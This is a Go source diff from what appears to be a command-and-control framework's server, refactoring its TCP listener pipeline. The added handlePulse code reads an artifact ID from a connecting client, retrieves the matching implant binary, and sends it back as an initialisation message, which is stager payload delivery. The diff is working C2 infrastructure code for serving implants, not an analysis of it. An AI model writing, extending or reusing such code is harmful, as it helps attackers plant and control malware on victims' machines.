@@ -9,20 +9,22 @@ import (
 	"github.com/chainreactors/malice-network/helper/encoders"
 	"github.com/chainreactors/malice-network/helper/encoders/hash"
 	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
+	"github.com/chainreactors/malice-network/helper/proto/implant/implantpb"
+	"github.com/chainreactors/malice-network/helper/proto/services/listenerrpc"
+	"github.com/chainreactors/malice-network/helper/types"
 	"github.com/chainreactors/malice-network/helper/utils/peek"
 	"github.com/chainreactors/malice-network/server/internal/certutils"
 	"github.com/chainreactors/malice-network/server/internal/core"
 	"github.com/chainreactors/malice-network/server/internal/parser"
-	"google.golang.org/grpc"
 	"io"
 	"net"
 )
 
-func NewTcpPipeline(conn *grpc.ClientConn, pipeline *clientpb.Pipeline) (*TCPPipeline, error) {
+func NewTcpPipeline(rpc listenerrpc.ListenerRPCClient, pipeline *clientpb.Pipeline) (*TCPPipeline, error) {
 	tcp := pipeline.GetTcp()
 
 	pp := &TCPPipeline{
-		grpcConn:       conn,
+		rpc:            rpc,
 		Name:           pipeline.Name,
 		Port:           uint16(tcp.Port),
 		Host:           tcp.Host,
@@ -38,13 +40,13 @@ func NewTcpPipeline(conn *grpc.ClientConn, pipeline *clientpb.Pipeline) (*TCPPip
 }
 
 type TCPPipeline struct {
-	ln       net.Listener
-	grpcConn *grpc.ClientConn
-	Name     string
-	Port     uint16
-	Host     string
-	Enable   bool
-	parser   *parser.MessageParser
+	ln     net.Listener
+	rpc    listenerrpc.ListenerRPCClient
+	Name   string
+	Port   uint16
+	Host   string
+	Enable bool
+	parser *parser.MessageParser
 	*core.PipelineConfig
 }
 
@@ -81,7 +83,7 @@ func (pipeline *TCPPipeline) Start() error {
 	if !pipeline.Enable {
 		return nil
 	}
-	forward, err := core.NewForward(pipeline.grpcConn, pipeline)
+	forward, err := core.NewForward(pipeline.rpc, pipeline)
 	if err != nil {
 		return err
 	}
@@ -152,12 +154,25 @@ func (pipeline *TCPPipeline) handlePulse(conn net.Conn) {
 		return
 	}
 	p := pipeline.parser
-	magic, _, err := p.ReadHeader(peekConn)
+	magic, artifactId, err := p.ReadHeader(peekConn)
 	if err != nil {
 		return
 	}
-	//build.GetOutPutPath(shellcodeId)
-	p.WritePacket(peekConn, nil, magic)
+	builder, err := pipeline.rpc.GetArtifact(context.Background(), &clientpb.Builder{
+		Id: uint32(artifactId),
+	})
+	if err != nil {
+		return
+	}
+	err = p.WritePacket(peekConn, types.BuildOneSpites(&implantpb.Spite{
+		Name: consts.ModuleInit,
+		Body: &implantpb.Spite_Init{
+			Init: &implantpb.Init{Data: builder.Bin},
+		},
+	}), magic)
+	if err != nil {
+		return
+	}
 }
 
 func (pipeline *TCPPipeline) handleBeacon(conn net.Conn) {
